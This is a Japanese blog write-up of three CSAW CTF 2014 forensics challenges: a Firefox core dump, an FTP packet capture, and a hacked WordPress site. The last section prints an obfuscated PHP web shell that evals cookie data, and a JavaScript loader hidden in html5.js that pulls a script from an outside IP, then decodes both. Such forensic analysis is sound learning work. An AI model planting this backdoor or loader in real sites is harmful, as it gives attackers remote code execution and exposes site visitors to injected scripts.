@@ -1,0 +1,548 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>CSAW CTF 2014 Quals Forensics - Hello (forgotten) world</title>
+  <meta name="author" content="Mei Akizuru">
+
+  
+  <meta name="description" content="CSAW CTF 2014 Quals、Forensicsのwrite-upです。私が解いたのはForensicsの4問中、200点のObscurityを除いた3問です。 [100] dumpster diving 問題文 dumpsters are cool, but cores are &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://tech.aquarite.info/blog/2014/09/23/csawctf2014-forensics/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+   <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css" />
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="Hello (forgotten) world" type="application/atom+xml">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+
+<!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href='http://fonts.googleapis.com/css?family=Lato:400,100,100italic,300,300italic,400italic,700,700italic,900,900italic' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Lora:400,400italic,700,700italic' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Source+Code+Pro:200,300,400,500,600,700,900' rel='stylesheet' type='text/css'>
+
+
+
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+</hgroup>
+
+</header>
+  <!-- <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:tech.aquarite.info" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav> -->
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">CSAW CTF 2014 Quals Forensics</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-09-23T03:07:38+09:00" pubdate data-updated="true">Sep 23<sup>rd</sup>, 2014</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>CSAW CTF 2014 Quals、Forensicsのwrite-upです。私が解いたのはForensicsの4問中、200点のObscurityを除いた3問です。</p>
+
+<h1>[100] dumpster diving</h1>
+
+<h2>問題文</h2>
+
+<blockquote><p>dumpsters are cool, but cores are cooler</p>
+
+<p>Written by marc</p>
+
+<p>firefox.mem.zip</p></blockquote>
+
+<h2>解答</h2>
+
+<p>Answer: cd69b4957f06cd818d7bf3d61980e291</p>
+
+<p>与えられるのは&#8217;firefox.mem.zip&#8217;で、コアダンプです。私が取りかかった時点で既に他のメンバーからbinwalkしてみたらSQLiteのなんかが見えていると報告がありました。Firefoxのコアダンプであれば何か見えててもおかしくないですね。</p>
+
+<p>とりあえずstringsで何か見えないかなと思ってstringsの出力結果を&#8217;flag&#8217;でgrepしてみます。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(前略)
+</span><span class='line'>etablemoz_annosmoz_annos CREATE TABLE moz_annos (  id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, mime_type VARCHAR(32) DEFAULT NULL, content LONGVARCHAR, flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0, dateAdded INTEGER DEFAULT 0, lastModified INTEGER DEFAULT 0)
+</span><span class='line'>ZZZZZZZZflag{cd69b4957f06cd818d7bf3d61980e291}
+</span><span class='line'>ZZZZZZZZZZZZZZTransparent BG enabling flag
+</span><span class='line'>(後略)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>マジで見つかりました。本当にありがとうございました。</p>
+
+<h1>[200] why not sftp?</h1>
+
+<h2>問題文</h2>
+
+<blockquote><p>well seriously, why not?</p>
+
+<p>Written by marc</p>
+
+<p>traffic-5.pcap</p></blockquote>
+
+<h2>解答</h2>
+
+<p>Answer: 91e02cd2b8621d0c05197f645668c5c4</p>
+
+<p>与えられる&#8217;traffic-5.pcap&#8217;をとりあえずWiresharkで見てみます。問題名が&#8217;why not sftp?&lsquo;なんだし、きっとFTP通信でなんかやってるだろうと思ってftpとftp-dataでフィルタします。通信を追っていくと&rsquo;/files/zip.zip&#8217;をダウンロードしています。当該するdataの方の通信をFollow TCP Streamするとflag.pngとか書いてあるのでまず間違いなさそうです。ftp-dataのパケットからzip.zipを抽出します。</p>
+
+<p>取り出したzip.zipはパスワードも何もかかっていないのでそのまま展開します。するとflag.pngが展開され、それにフラグが書かれていました。</p>
+
+<p>余談ですが、HTTPでやりとりしたファイルはWiresharkのExport Objectsから取り出せますが、FTPの場合はデータ通信の方をFollow TCP StreamしてRawで保存すればよいことをお勉強しました。</p>
+
+<h1>[300] Fluffy No More</h1>
+
+<h2>問題文</h2>
+
+<blockquote><p>OH NO WE&rsquo;VE BEEN HACKED!!!!!! &ndash; said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site&rsquo;s users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious &ldquo;Forgotten Freaks&rdquo; hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??</p>
+
+<p>Well&hellip; The fluff needs your stuff. I&rsquo;ve pulled the logs from the server for you along with a backup of it&rsquo;s database and configuration. Figure out what is going on!</p>
+
+<p>Written by brad_anton</p>
+
+<p>CSAW2014-FluffyNoMore-v0.1.tar.bz2</p></blockquote>
+
+<h2>解答</h2>
+
+<p>Answer: Those Fluffy Bunnies Make Tummy Bumpy</p>
+
+<p>与えられたアーカイブを展開すると、etc_directory.tar.bz、logs.tar.bz2、webroot.tar.bz2、mysql_backup.sql.bz2の4つのファイルが出てきます。それぞれ、etc以下、/var/log以下、/var/www以下を固めたもので、mysql_backup.sql.bz2はmysqldumpの出力結果をbzip2で圧縮したものです。</p>
+
+<p>/var/www以下やデータベースのダンプを見るにWordPressが動いていて、そこがやられたという状況のようです。ひとまずapache2のaccess.logを見ていきます。非常に大きなファイルですが、大半はツールによるアタック試行のログです。SQLインジェクションやら何やらを色々試しています。データベースのダンプを見るとwp_commentsに犯人による犯行予告（「ハックしてやったぜBWHAHAHAHA」じゃなくて「ハックしてやるぜBWHAHAHA」だった）があるので、そのコメントの時刻以降のログを見てみます。</p>
+
+<p>まずPOSTに絞って見てみるとプラグイン絡みでちょっと怪しげなログを見つけました。wysija-newslettersというプラグインで、そのプラグインについて調べてみたところ、任意ファイルのアップロードが可能な脆弱性が存在していたそうです。その後その脆弱性は修正されましたが、実際にはPHPの設定によってはその対策をすり抜けることが可能でした（そしてさらに対策される）。この環境にインストールされているもののバージョンを調べてみると、ちょうどその脆弱性が残っていたバージョンだった上に、<a href="http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html">WordPress Security - MailPoet Vuln Contributes to Thousands of Infected Websites | Sucuri Blog</a>で言及されているのと同じ形のログが残っていました。</p>
+
+<p>アクセスログから/wp-content/uploads/wysija/themes/weblizer/template.phpというのにアクセスしていることがわかったので、そのファイルを見てみます。中身は次のようなPHPファイルです。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;?php
+</span><span class='line'>$hije = str_replace("ey","","seyteyrey_reyeeypleyaeyceye");
+</span><span class='line'>$andp="JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ";
+</span><span class='line'>$rhhm="nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==";
+</span><span class='line'>$pvqw="GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw";
+</span><span class='line'>$wfrm="bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq";
+</span><span class='line'>$vyoh = $hije("n", "", "nbnansne64n_ndnecode");
+</span><span class='line'>$bpzy = $hije("z","","zczreaztzez_zfzuznzcztzizon");
+</span><span class='line'>$xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
+</span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>$hije</code>が<code>str_replace</code>、<code>$vyoh</code>が<code>base64_decode</code>、<code>$bpzy</code>が<code>create_function</code>関数です。このとき初めて知ったんですが、PHPでは文字列変数に対して<code>$hoge()</code>みたいに<code>()</code>を付けて使うと、その変数に入っている名前の関数を呼び出すという機能があります。びっくり。</p>
+
+<p>それはともかくとして、このコードは</p>
+
+<ol>
+<li><code>$andp</code>、<code>$pvqw</code>、<code>$wfrm</code>、<code>$rhhm</code>を結合する</li>
+<li>その中の&#8217;sq&#8217;を取り除く</li>
+<li>その文字列をBase64デコードする</li>
+<li>その文字列を関数化する</li>
+<li>それを実行する</li>
+</ol>
+
+
+<p>というコードです。<code>create_function</code>で関数化されたコードは次のコードです（実際の出力を整形しています）</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$c='count';
+</span><span class='line'>$a=$_COOKIE;
+</span><span class='line'>if (reset($a) == 'ha' && $c($a) &gt; 3) {
+</span><span class='line'>  $k='ckit';
+</span><span class='line'>  echo '&lt;'.$k.'&gt;';
+</span><span class='line'>  eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
+</span><span class='line'>  echo '&lt;/'.$k.'&gt;';
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cookieが所定の条件を満たすとき、その中に入っているBase64文字列をevalする、というコードのようです。どう見てもバックドアです。本当にありがとうございました。</p>
+
+<p>しかし、ログに記録されてない上にパケットキャプチャもないので、Cookieの中身はわかりません。つまりどんなコードが実行されたのかが全く不明です。データベースの中に何かしら残っていないか探してみましたが見つかりません。ここで一旦手詰まりとなってしまいました。</p>
+
+<p>そこで隣に座ってた某氏が&#8217;/var/log/auth.log&#8217;を見ていて次の箇所を指摘しました。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ご覧の通り、sudoでviが実行されています。察し。……ていうかubuntuユーザーでログインされてsudoまでされてるんですがそれは……。</p>
+
+<p>それはともかく/wp-content/themes/twentythirteen/js/html5.jsを見てみます。先頭のコメントにHTML5 Shivとあります。バージョンは3.7.0。<a href="https://github.com/aFarkas/html5shiv">HTML5Shivのリポジトリ</a>から3.7.0のファイルをダウンロードし、このファイルとの差異を探すと、末尾に次のコードが追加されていました。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i&lt;f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i&lt;c.length;i++){if(((i==3||i==6)&&w!=2)||((i==8)&&w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("&lt;"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'&gt;\&lt;/"+m+"\&gt;");</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="http://jsbeautifier.org/">beautify</a>してみます。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var g = "ti";
+</span><span class='line'>var c = "HTML Tags";
+</span><span class='line'>var f = ". li colgroup br src datalist script option .";
+</span><span class='line'>f = f.split(" ");
+</span><span class='line'>c = "";
+</span><span class='line'>k = "/";
+</span><span class='line'>m = f[6];
+</span><span class='line'>for (var i = 0; i &lt; f.length; i++) {
+</span><span class='line'>    c += f[i].length.toString();
+</span><span class='line'>}
+</span><span class='line'>v = f[0];
+</span><span class='line'>x = "\'ht";
+</span><span class='line'>b = f[4];
+</span><span class='line'>f = 2541 * 6 - 35 + 46 + 12 - 15269;
+</span><span class='line'>c += f.toString();
+</span><span class='line'>f = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;
+</span><span class='line'>c += f.toString();
+</span><span class='line'>f = "";
+</span><span class='line'>c = c.split("");
+</span><span class='line'>var w = 0;
+</span><span class='line'>u = "s";
+</span><span class='line'>for (var i = 0; i &lt; c.length; i++) {
+</span><span class='line'>    if (((i == 3 || i == 6) && w != 2) || ((i == 8) && w == 2)) {
+</span><span class='line'>        f += String.fromCharCode(46);
+</span><span class='line'>        w++;
+</span><span class='line'>    }
+</span><span class='line'>    f += c[i];
+</span><span class='line'>}
+</span><span class='line'>i = k + "anal";
+</span><span class='line'>document.write("&lt;" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "c" + u + v + "j" + u + "\'&gt;\&lt;/" + m + "\&gt;");</span></code></pre></td></tr></table></div></figure>
+
+
+<p>このコードをnodeに与えて、<code>document.write</code>の引数になっている文字列を見てみると次のようになります。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script src='http://128.238.66.100/analytics.js'&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>つまりhtml5.jsが実行されると&#8217;<a href="http://128.238.66.100/analytics.js">http://128.238.66.100/analytics.js</a>&#8216;が読まれて実行されるわけです。ここにアクセスしてanalytics.jsを見てみます（長いので中身は省略します）。すると、明らかにおかしな箇所がありました。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
+</span><span class='line'>window[_0x91fe[2]](_0x91fe[0], _0x91fe[1]);</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>_0x91fe</code>に代入している箇所をnodeに与えて中身を見てみます。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
+</span><span class='line'>undefined
+</span><span class='line'>&gt; _0x91fe
+</span><span class='line'>[ 'http://128.238.66.100/announcement.pdf',
+</span><span class='line'>  '_self',
+</span><span class='line'>  'open' ]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>これを踏まえた上で先のコードの2行目を見れば、<code>window['open']</code>(<code>window.open</code>関数)で&#8217;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;を開いていることになります。</p>
+
+<p>&lsquo;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;は実際にPDFで、なんかビジュアル系バンドっぽい人物の写真に&#8217;I AM HACKING YOU RIGHT NOW&#8217;という文が書いてある画像があるだけのPDFです。</p>
+
+<p>ひとしきりここで爆笑して作業に戻りますと、pdfextractでストリームデータをダンプしてみるように言われました。-sオプションを使ってストリームをダンプします。結果として&#8217;stream_{1,2,3,8}.dmp&#8217;の4つのファイルが現れます。これらに対してひとまずstringsをしてみます（ていうか先にfileで見てみるべきだったかもしれない）。すると&#8217;stream_8.dmp&#8217;に何か書かれています。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];</span></code></pre></td></tr></table></div></figure>
+
+
+<p>JavaScriptっぽいのでnodeに与えてみます。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt; var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
+</span><span class='line'>undefined
+</span><span class='line'>&gt; _0xee0b
+</span><span class='line'>[ 'YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}' ]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>というわけで無事にフラグを得ることができました。</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Mei Akizuru</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-09-23T03:07:38+09:00" pubdate data-updated="true">Sep 23<sup>rd</sup>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/csaw-ctf/'>csaw ctf</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/write-up/'>write-up</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://tech.aquarite.info/blog/2014/09/23/csawctf2014-forensics/" data-via="maytheplic" data-counturl="http://tech.aquarite.info/blog/2014/09/23/csawctf2014-forensics/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/09/22/csawctf2014-trivia/" title="Previous Post: CSAW CTF 2014 Quals Trivia">&laquo; CSAW CTF 2014 Quals Trivia</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section id="titles">
+  <h1 id="site_title"><a href="http://tech.aquarite.info" title="Hello (forgotten) world">Hello (forgotten) world</a></h1>
+  <h3 id="site_subtitle">Kogasa-chan is kawaii.</h3>
+</section>
+
+<section id="menu">
+  <ul>
+    <li><i class="fa fa-home fa-lg"></i><a href="http://tech.aquarite.info"> Home </a></li>
+    <li><i class="fa fa-calendar fa-lg"></i><a href="http://tech.aquarite.info/blog/archives/"> Archives </a></li>
+    <li><i class="fa fa-user fa-lg"></i><a href="http://tech.aquarite.info/about/"> About </a></li>
+    <li><i class="fa fa-rss fa-lg"></i><a href="http://tech.aquarite.info/atom.xml"> Feed </a></li>
+  </ul>
+</section>
+
+<section id="social">
+  
+
+  
+
+  
+
+  
+    <a href="https://github.com/mayth" title="mayth"><i class="fa fa-github fa-2x"></i></a>
+  
+
+  
+
+  
+    <a href="https://twitter.com/maytheplic" title="maytheplic"><i class="fa fa-twitter fa-2x"></i></a>
+  
+</section>
+
+
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/09/23/csawctf2014-forensics/">CSAW CTF 2014 Quals Forensics</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/22/csawctf2014-trivia/">CSAW CTF 2014 Quals Trivia</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/07/20/seccon2014-online-preliminary/">SECCON 2014 オンライン予選 その他諸々</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/07/20/seccon2014-online-printit/">SECCON 2014 オンライン予選 【Print it!】</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/07/20/seccon2014-online-amida/">SECCON 2014 オンライン予選 【あみだくじ】</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/mayth">@mayth</a> on GitHub
+  
+  <script type="text/javascript">
+    $.domReady(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'mayth',
+            count: 0,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Mei Akizuru -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
